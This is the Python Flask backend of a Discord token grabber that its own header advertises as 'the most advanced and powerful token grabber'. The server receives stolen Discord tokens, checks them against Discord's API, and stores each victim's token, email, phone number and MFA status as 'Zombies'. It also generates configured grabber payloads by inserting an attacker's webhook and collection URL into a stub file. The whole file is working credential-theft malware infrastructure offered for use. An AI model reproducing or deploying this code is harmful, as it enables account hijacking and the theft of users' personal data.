#~~~~                                      ~~~~#
# "тнe мoѕт αdvαɴced αɴd powerғυl тoĸeɴ ɢrαввer"
#                ιтѕ_Ѵιcнч#1337                #
#~~        github.com/Its-Vichy/EL1T3        ~~#
#~~~~                                      ~~~~#

from flask import request, make_response
import flask, requests, json, asyncio
from tinydb import TinyDB, Query

class Cache():
    def __init__(self):
        self.Tokens = []
        self.Zombies = []
        self.ZombieNumber = len(self.Zombies)

    def GetZombiesNumber(self):
        return self.ZombieNumber

    def AddZombie(self, Token, table = None, Checker = None):
        if Token[:20] not in self.Tokens:
            self.Zombies.append(Token)
            self.Tokens.append(Token[:20])
            
            if table != None:
                table.insert({'Token':Token, 'Email': Checker.GetEmailAddr(), 'Discriminator': Checker.GetDiscriminator(),'Username': Checker.GetUsername(),'Verified': Checker.GetVerified(),'Country': Checker.GetCountry(),'Phone': Checker.GetPhone(),'Nsfw': Checker.GetNsfw(),'Id': Checker.GetId(),'Mfa': Checker.GetMfa()})

    def LoadZombies(self):
        with open('./Database.json', 'r+') as DbFile:
            Db = json.load(DbFile)

            for Zombies in Db['Accounts']:
                Token = Db['Accounts'][Zombies]['Token']
                
                if Token not in self.Zombies:
                    self.Zombies.append(Token)
                    self.Tokens.append(Token[:20])
                
class TokenTools():
    def __init__(self, Token):
        self.CheckerUrl = f'https://discordapp.com/api//sso?token={Token}'
        self.InfoUrl    = 'https://discordapp.com/api/v8/users/@me'
        self.Headers    = {'Authorization': Token, 'content-type': 'application/json'}
        self.Info       = requests.get(self.InfoUrl, headers=self.Headers).json()

    def IsDisabled(self):
        if 'Unauthorized' in self.Info:
            return True
        else:
            return False
    
    def GetEmailAddr(self):
        return self.Info['email']

    def GetUsername(self):
        return self.Info['username']

    def GetId(self):
        return self.Info['id']
    
    def GetDiscriminator(self):
        return self.Info['discriminator']

    def GetCountry(self):
        return self.Info['locale']

    def GetMfa(self):
        return self.Info['mfa_enabled']

    def GetVerified(self):
        return self.Info['verified']

    def GetPhone(self):
        return self.Info['phone']

    def GetNsfw(self):
        return self.Info['nsfw_allowed']

    def GetAvatar(self):
        return f"https://cdn.discordapp.com/avatars/{self.Info['id']}/{self.Info['avatar']}.png"

class API():
    def __init__(self):
        self.Cache = Cache()
        self.app   = flask.Flask(__name__)
        self.db    = TinyDB('./Database.json')
        app        = self.app

        def RegisterToken(Token):
            Checker = TokenTools(Token)

            if Checker.IsDisabled() == True:
                return
            else:
                self.Cache.AddZombie(Token, self.db.table('Accounts'), Checker)

        @app.errorhandler(404)
        def PageNotFound(e):
            return "Error 404 ;(", 404

        @app.route('/api/SendToken/', methods=['POST'])
        def SendToken():
            Token = request.args.get('Token')
            RegisterToken(Token)
            return 'Sucess'

        @app.route('/api/GrabberCode/<api_url>/<dynamic>/<Webhook_id>/<Webhook_token>', methods=['POST'])
        def SendCode(api_url=None, dynamic=None, Webhook_id= None, Webhook_token= None):
            Code = ''
            with open("./stub.txt", "r") as f:
                for line in f:
                    Code += line
            
            FinalCode = Code.replace('WEBHOOKURLHERE', f'https://discord.com/api/webhooks/{Webhook_id}/{Webhook_token}').replace('APIURLHERE', 'http://' + api_url + '/api/SendToken/?Token=').replace('DYNAMICHERE', 'False' if dynamic == 'FALSE' else 'True')
            print(FinalCode)
            response = make_response(FinalCode, 200)
            response.mimetype = "text/plain"
            return response

    def run(self):
        self.Cache.LoadZombies()
        self.app.run(host= '0.0.0.0', port= 1337)

API().run()